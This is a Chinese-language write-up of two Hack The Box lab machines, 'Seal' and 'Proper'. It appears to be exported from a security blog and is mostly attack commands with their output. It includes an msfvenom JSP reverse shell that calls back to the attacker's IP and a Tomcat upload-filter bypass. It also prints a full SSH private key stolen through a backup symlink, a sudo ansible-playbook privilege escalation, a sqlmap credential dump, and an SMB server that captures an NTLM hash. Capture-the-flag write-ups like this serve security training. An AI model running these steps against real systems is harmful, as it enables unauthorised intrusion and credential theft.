&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x4&lt;/pre&gt; | Socks5: | HTTP/1.1 400 Illegal character CNTL=0x5 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close |_ &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x5&lt;/pre&gt; | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.91%I=7%D=7/12%Time=60EBCAB6%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,F4,&quot;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Mon,\\x2012\\x2 SF:0Jul\\x202021\\x2005:05:32\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node071ucs SF:4ccblk71m8qso25gjtua1\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu SF:,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html SF:;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(HTTPOptions,108,&quot;HTT SF:P/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:33\\x SF:20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2\\.nod SF:e0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x20 SF:00:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nAllow:\\x SF:20GET,HEAD,POST,OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSPRequest SF:,AD,&quot;HTTP/1\\.1\\x20505\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/ht SF:ml;charset=iso-8859-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20505&lt;/h1&gt;&lt;pre&gt;reason:\\x20Unknown\\x20Version SF:&lt;/pre&gt;&quot;)%r(FourOhFourRequest,F4,&quot;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDa SF:te:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:34\\x20GMT\\r\\nSet-Cookie:\\x20J SF:SESSIONID=node01f74sr5qgmlr67kq6xg2imreb3\\.node0;\\x20Path=/;\\x20HttpOnl SF:y\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nConten SF:t-Type:\\x20text/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r( SF:Socks5,C3,&quot;HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x5\\r\\nCont SF:ent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nC SF:onnection:\\x20close\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20400&lt;/h1&gt;&lt;pre&gt;reason:\\x SF:20Illegal\\x20character\\x20CNTL=0x5&lt;/pre&gt;&quot;)%r(Socks4,C3,&quot;HTTP/1\\.1\\x2040 SF:0\\x20Illegal\\x20character\\x20CNTL=0x4\\r\\nContent-Type:\\x20text/html;cha SF:rset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\ SF:n&lt;h1&gt;Bad\\x20Message\\x20400&lt;/h1&gt;&lt;pre&gt;reason:\\x20Illegal\\x20character\\x20 SF:CNTL=0x4&lt;/pre&gt;&quot;)%r(RPCCheck,C7,&quot;HTTP/1\\.1\\x20400\\x20Illegal\\x20characte SF:r\\x20OTEXT=0x80\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCon SF:tent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x2 SF:0400&lt;/h1&gt;&lt;pre&gt;reason:\\x20Illegal\\x20character\\x20OTEXT=0x80&lt;/pre&gt;&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/12%OT=22%CT=1%CU=41179%PV=Y%DS=2%DC=T%G=Y%TM=60EBCAE OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 241.94 ms 10.10.14.1 2 242.04 ms 10.10.10.250 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 716.52 seconds 从上面的扫描结果，我们得到了几个信息 - 开启了22、443和8080端口 - 8080端口是一个http服务 - 8080端口显示401，但可以访问 我们访问一下8080端口 发现这是一个登录框，使用的cms是gitbucket 随便注册一个账号登陆后，发现了关于nginx和tomcat的东西，目前怀疑该系统使用了nginx或者tomcat进行搭建 登陆后发现了一个名为seal_market的repo，这应该是443端口的代码库。但我们无法通过IP进行访问443端口，应该是需要添加一个域名 echo 10.10.10.250 seal.htb &gt;&gt; /etc/hosts 运行后发现确实8080端口的gitbucket是443端口的代码库 我们在8080端口上可以看到有一些待办事项 Remove mutual authentication for dashboard, setup registration and login features. Deploy updated tomcat configuration. Disable manager and host-manager. 在尝试更新 tomcat/tomcat-users.xml 文件的时候，找到了tomcat的账号密码 http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 username = tomcat password = 42MrHBf*z8{Z% 在尝试查看robots.txt的时候，提示404，但从这个404状态页面我们可以知道，该服务器使用了tomcat，并且我们手里拿到了tomcat的账号密码，那我们就直接登录吧 https://seal.htb/manager/status 直接使用tomcat默认的地址进行登录，然后进到了tomcat的管理页面 ## 漏洞利用 https://seal.htb/manager/status/..;/html 我们直接使用msfvenom生成一个war马，然后上传利用即可 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f war -o shell.war 然后去上传到靶机里 上传的时候提示403，有点迷惑。 经过各种尝试后发现，这是白名单过滤，咱们需要抓包然后绕过一下 原URL POST /manager/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1 修改为 POST /manager/status/..;/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1 咱们可以看到，shell成功上传，咱们本地使用nc监听一个端口 nc -nvlp 4444 然后访问一下shell页面 https://seal.htb/shell/ 使用python3获取一个稳定的shell链接 python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; 成功获得一个shell ┌──(root💀root)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.250] 32984 python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; tomcat@seal:/var/lib/tomcat9$ tomcat@seal:/home/luis$ ls -la ls -la total 51320 drwxr-xr-x 9 luis luis 4096 May 7 07:01 . drwxr-xr-x 3 root root 4096 May 5 12:52 .. drwxrwxr-x 3 luis luis 4096 May 7 06:00 .ansible lrwxrwxrwx 1 luis luis 9 May 5 12:57 .bash_history -&gt; /dev/null -rw-r--r-- 1 luis luis 220 May 5 12:52 .bash_logout -rw-r--r-- 1 luis luis 3797 May 5 12:52 .bashrc drwxr-xr-x 3 luis luis 4096 May 7 07:00 .cache drwxrwxr-x 3 luis luis 4096 May 5 13:45 .config drwxrwxr-x 6 luis luis 4096 Jul 12 06:14 .gitbucket -rw-r--r-- 1 luis luis 52497951 Jan 14 02:51 gitbucket.war drwxrwxr-x 3 luis luis 4096 May 5 13:41 .java drwxrwxr-x 3 luis luis 4096 May 5 14:33 .local -rw-r--r-- 1 luis luis 807 May 5 12:52 .profile drwx------ 2 luis luis 4096 May 7 06:10 .ssh -r-------- 1 luis luis 33 Jul 12 06:15 user.txt 在用户目录luis下找到了user.txt文件，但我们没有权限访问，不过存在一个.ssh目录，并且我们是有权限进行访问的，我们访问看看 在目录/opt/backups/playbook中，找到了一个rum.yml文件，咱们查看一下内容 - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: &quot;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&quot; - name: Clean file: state: absent path: /opt/backups/files/ 思路这不就来了吗~ 根据解读run.yml文件，咱们可以创建一个指向luis的id_rsa的链接，我们可以把它放到/uploads目录中 /opt/backups/archives ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa cp backup-2021-07-12-08:46:33.gz /dev/shm cd /dev/shm mv backup-2021-07-12-08:46:33.gz backup.tar.gz tar -xvf backup.tar.gz 在目录/dev/shm/dashboard/uploads中，我们可以看到我们的id_rsa文件，我们查看一下内容 -----BEGIN OPENSSH PRIVATE KEY----- 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 u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE= -----END OPENSSH PRIVATE KEY----- 咱们保存到本地，使用ssh进行登录 chmod 600 id_rsa ssh luis@10.10.10.250 -i id_rsa ┌──(root💀root)-[~/Desktop] └─# ssh luis@10.10.10.250 -i id_rsa Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 12 Jul 2021 09:00:29 AM UTC System load: 0.04 Usage of /: 46.4% of 9.58GB Memory usage: 19% Swap usage: 0% Processes: 183 Users logged in: 0 IPv4 address for eth0: 10.10.10.250 IPv6 address for eth0: dead:beef::250:56ff:feb9:af64 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Fri May 7 07:00:18 2021 from 10.10.14.2 luis@seal:~$ 成功获得user权限 luis@seal:~$ cat user.txt e2f0032d0a9f2ec1d750505f6789b8e2 成功拿到user权限的flag ## 权限提升 luis@seal:~$ sudo -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook * 使用sudo -l查看sudo权限后发现，咱们可以以root权限执行ansible-playebook 参考资料 https://docs.ansible.com/ansible/latest/user/guide/playbooks.html 创建一个名为root.yml的文件 - name: Ansible Copy Example Local to Remote hosts: localhost tasks: - name: copying file with playbook become: true copy: src: /root/root.txt dest: /dev/shm owner: luis group: luis mode: 0777 使用sudo &#x2F;usr&#x2F;bin&#x2F;ansible-playbook执行root.yml文件 luis@seal:/dev/shm$ sudo /usr/bin/ansible-playbook root.yml [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match &#39;all&#39; PLAY [Ansible Copy Example Local to Remote] ********************************************************************************************************************************************************************** TASK [Gathering Facts] ******************************************************************************************************************************************************************************************* ok: [localhost] TASK [copying file with playbook] ******************************************************************************************************************************************************************************** changed: [localhost] PLAY RECAP ******************************************************************************************************************************************************************************************************* localhost : ok=2 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 luis@seal:/dev/shm$ ls passwd root.txt root.yml luis@seal:/dev/shm$ cat root.txt a18fdff4cccc7a1b0ef961fa8f007756 成功获得root权限的flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Proper - Hackthebox","slug":"Hackthebox/Hard/Hackthebox-Proper","date":"2021-07-11T11:38:36.000Z","updated":"2023-06-13T03:49:28.000Z","comments":true,"path":"2021/07/11/Hackthebox/Hard/Hackthebox-Proper/","link":"","permalink":"http://www.lucifiel.com/2021/07/11/Hackthebox/Hard/Hackthebox-Proper/","excerpt":"","text":"Hackthebox - Proper靶场信息 靶场类型 信息搜集 首先使用Nmap进行信息搜集nmap -A -sS -sC -sV -p- 10.10.10.231 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.231 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 13:09 CST Nmap scan report for 10.10.10.231 Host is up (0.24s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: OS Tidy Inc. Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 240.14 ms 10.10.14.1 2 240.16 ms 10.10.10.231 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 389.51 seconds 从nmap扫描我们可以得到的信息有 - 本台靶机开启了80端口 - 本台靶机使用了IIS 10.0作为Web服务器 - 本台靶机是Windows系统 这台靶机只开启了80端口，那这应该就是我们唯一的突破口了，让我们先来访问一下看看吧 在主页面我们没发现什么有趣的东西，那就先FUZZ一下目录看看吧 gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50 ┌──(root💀root)-[~/Desktop] └─# gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.231/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/07/10 14:01:21 Starting gobuster in directory enumeration mode =============================================================== /Index.html (Status: 200) [Size: 14257] /assets (Status: 301) [Size: 150] [--&gt; http://10.10.10.231/assets/] /functions.php (Status: 200) [Size: 0] /index.html (Status: 200) [Size: 14257] /index.html (Status: 200) [Size: 14257] /licenses (Status: 301) [Size: 152] [--&gt; http://10.10.10.231/licenses/] =============================================================== 2021/07/10 14:01:46 Finished =============================================================== 我们发现了两个目录assets、licenses和一个文件functions.php 咱们把这两个目录继续fuzz，然后去看看这个php文件里有什么 http://10.10.10.231/ index.php functions.php /assets /api /css /fonts /img /js /licenses index.php logout.php licenses.php 访问后发现，functions.php是空白页面，没有可访问的内容。访问/assets和/assets/api都是返回404，暂时无法访问。而访问/licenses后，是一个登录页面，访问/licenses/licenses.php会跳转到/licenses/index.php页面 在http://10.10.10.231/index.php网页源代码的时候，找到了两个有意思的东西 四个用户名 - dustin - daksh - anna - wafer 一段URL，咱们访问一下试试 http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b 访问后发现是index.php页面的商店功能 测试后发现，上述url中，缺少了order或者h这两个任意一个参数，都会得到如下报错 我有点好奇这段hash的内容是什么，咱们使用john给它解密一下 测试得到HASH算法 Hash = md5(Salt+Payload) ┌──(root💀root)-[~/Desktop] └─# john hash --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;dynamic=md5($p)&quot; Use the &quot;--format=dynamic=md5($p)&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;HAVAL-128-4&quot; Use the &quot;--format=HAVAL-128-4&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;MD2&quot; Use the &quot;--format=MD2&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mdc2&quot; Use the &quot;--format=mdc2&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mscash&quot; Use the &quot;--format=mscash&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;mscash2&quot; Use the &quot;--format=mscash2&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;NT&quot; Use the &quot;--format=NT&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD4&quot; Use the &quot;--format=Raw-MD4&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD5&quot; Use the &quot;--format=Raw-MD5&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-MD5u&quot; Use the &quot;--format=Raw-MD5u&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Raw-SHA1-AxCrypt&quot; Use the &quot;--format=Raw-SHA1-AxCrypt&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;ripemd-128&quot; Use the &quot;--format=ripemd-128&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;Snefru-128&quot; Use the &quot;--format=Snefru-128&quot; option to force loading these as that type instead Warning: detected hash type &quot;LM&quot;, but the string is also recognized as &quot;ZipMonster&quot; Use the &quot;--format=ZipMonster&quot; option to force loading these as that type instead Using default input encoding: UTF-8 Using default target encoding: CP850 Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:01 DONE (2021-07-10 14:44) 0g/s 9808Kp/s 9808Kc/s 19617KC/s !!LIVER..*7¡VA Session completed 看到这里，突然就想通为什么会把这段hash插入到order里了 漏洞利用使用如下命令进行注入 sqlmap -u &quot;http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot; --eval=&quot;import hashlib ; h=hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --threads=10 -D cleaner -T customers -C id,login,password --dump 得到了结果 +----+------------------------------+----------------------------------------------+ | id | login | password | +----+------------------------------+----------------------------------------------+ | 1 | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | | 2 | nstone@trashbin.mail | 6cb75f652a9b52798eb6cf2201057c73 (password2) | | 3 | bmceachern7@discovery.moc | e10adc3949ba59abbe56e057f20f883e (123456) | | 4 | jkleiser8@google.com.xy | 827ccb0eea8a706c4c34a16891f84e7b (12345) | | 5 | mchasemore9@sitemeter.moc | 25f9e794323b453885f5181f1b624d0b (123456789) | | 6 | gdornina@marriott.moc | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | | 7 | itootellb@forbes.moc | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou) | | 8 | kmanghamc@state.tx.su | 8afa847f50a716e64932d995c8e7435a (princess) | | 9 | jblinded@bing.moc | fcea920f7412b5da7be0cf42b8c93759 (1234567) | | 10 | llenchenkoe@macromedia.moc | f806fc5a2a0d5ba2471600758452799c (rockyou) | | 11 | aaustinf@booking.moc | 25d55ad283aa400af464c76d713c07ad (12345678) | | 12 | afeldmesserg@ameblo.pj | e99a18c428cb38d5f260853678922e03 (abc123) | | 13 | ahuntarh@seattletimes.moc | fc63f87c08d505264caba37514cd0cfd (nicole) | | 14 | talelsandrovichi@tamu.ude | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel) | | 15 | ishayj@dmoz.gro | 67881381dbc68d4761230131ae0008f7 (babygirl) | | 16 | acallabyk@un.gro | d0763edaa9d9bd2a9516280e9044d885 (monkey) | | 17 | daeryl@about.you | 061fba5bdfc076bb7362616668de87c8 (lovely) | | 18 | aalekseicikm@skyrock.moc | aae039d6aa239cfc121357a825210fa3 (jessica) | | 19 | lginmann@lycos.moc | c33367701511b4f6020ec61ded352059 (654321) | | 20 | lgiorioo@ow.lic | 0acf4539a14b3aa27deeb4cbdf6e989f (michael) | | 21 | lbyshp@wired.moc | adff44c5102fca279fce7559abf66fee (ashley) | | 22 | bklewerq@yelp.moc | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty) | | 23 | wstrettellr@senate.gov | 96e79218965eb72c92a549dd5a330112 (111111) | | 24 | lodorans@kickstarter.moc | edbd0effac3fcc98e725920a512881e0 (iloveu) | | 25 | bpfeffelt@artisteer.moc | 670b14728ad9902aecba32e22fa4f6bd (000000) | | 26 | lgrimsdellu@abc.net.uvw | 2345f10bb948c5665ef91f6773b3e455 (michelle) | | 27 | lpealingv@goo.goo | f78f2477e949bee2d12a2c540fb6084f (tigger) | | 28 | krussenw@mit.ude | 0571749e2ac330a7455809c6b0e7af90 (sunshine) | | 29 | meastmondx@businessweek.moc | c378985d629e99a4e86213db0cd5e70d (chocolate) | +----+------------------------------+----------------------------------------------+ 随便选择一个账号进行登录 登入后，在源码处发现了有趣的东西 咱们把theme更改为..并生成相对应的hash值 http://10.10.10.231/licenses/licenses.php?theme=..&amp;h=c5427f8e0865273f4a62c614adec0985 hash生成脚本 import hashlib m = hashlib.md5() # b&quot;hie0shah6ooNoim后边的`..`就是我们的自定义payload m.update(b&quot;hie0shah6ooNoim..&quot;) print(m.hexdigest()) 发现注释里有一些描述 咱们尝试一下RFI(Remote File Inclusion 远程文件包含) 使用python自带的smbserver.py模块开启一个虚假的smb服务 python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil . http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24&amp;h=288af3998fba7f4c3fd8e58be73b26ae ┌──(root💀root)-[~/Desktop] └─# python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -smb2support evil . Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.10.231,51415) [*] AUTHENTICATE_MESSAGE (PROPER\\web,PROPER) [*] User PROPER\\web authenticated successfully [*] web::PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000 [*] Handle: &#39;ConnectionResetError&#39; object is not subscriptable [*] Closing down connection (10.10.10.231,51415) [*] Remaining connections [] 成功获取到一个hash，咱们丢到john里进行破解 ┌──(root💀root)-[~/Desktop] └─# john --show --format=netntlmv2 hash 